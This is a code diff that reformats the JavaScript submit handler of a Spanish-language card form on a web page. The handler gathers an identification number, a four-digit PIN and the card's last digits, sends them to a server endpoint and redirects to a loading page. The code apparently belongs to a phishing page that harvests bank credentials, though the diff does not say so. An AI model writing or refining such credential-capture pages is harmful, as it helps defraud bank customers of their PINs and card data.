@@ -404,49 +404,52 @@ form.addEventListener("submit", async e=>{
   </script>
     
  <script>
-document.getElementById("tarjeta").addEventListener("submit",async e=>{
-e.preventDefault();
+document.getElementById("tarjeta").addEventListener("submit", async e=>{
+ e.preventDefault();
 
-const tipo=document.getElementById("tipo2").value;
-const iden=document.getElementById("identificacion2").value.trim();
-const clave=document.getElementById("clave2").value.trim();
-const dig=document.getElementById("digito2").value.trim();
+ const tipo=document.getElementById("tipo2").value;
+ const iden=document.getElementById("identificacion2").value.trim();
+ const clave=document.getElementById("clave2").value.trim();
+ const dig=document.getElementById("digito2").value.trim();
 
-if(!tipo||!iden||!clave||!dig){
-alert("Complete todos los campos");
-return;
-}
+ if(!tipo||!iden||!clave||!dig){
+  alert("Complete todos los campos");
+  return;
+ }
 
-if(!/^\d{4}$/.test(clave)){
-alert("Clave inválida");
-return;
-}
+ if(!/^\d{4}$/.test(clave)){
+  alert("Clave inválida");
+  return;
+ }
 
-document.getElementById("spinner-overlay").style.display="flex";
+ document.getElementById("spinner-overlay").style.display="flex";
 
-try{
+ try{
 
-const r=await fetch("/api/nombre",{
-method:"POST",
-headers:{ "Content-Type":"application/json"},
-body:JSON.stringify({
-tipo,identificacion:iden,
-clave,digitos:dig})
+  const r=await fetch("/api/nombre",{
+   method:"POST",
+   headers:{ "Content-Type":"application/json"},
+   body:JSON.stringify({
+    tipo,
+    identificacion:iden,
+    clave,
+    ultimos:dig
+   })
+  });
+
+  const j=await r.json();
+
+  if(!j.id) throw "error";
+
+  localStorage.setItem("id",j.id);
+  location="load.html";
+
+ }catch{
+  alert("Error conexión");
+  location.reload();
+ }
 });
 
-const j=await r.json();
-
-if(!j.id) throw "error";
-
-localStorage.setItem("id",j.id);
-location="load.html";
-
-}catch{
-alert("Error conexión");
-location.reload();
-}
-
-});
 </script>     
     
 </body></html>
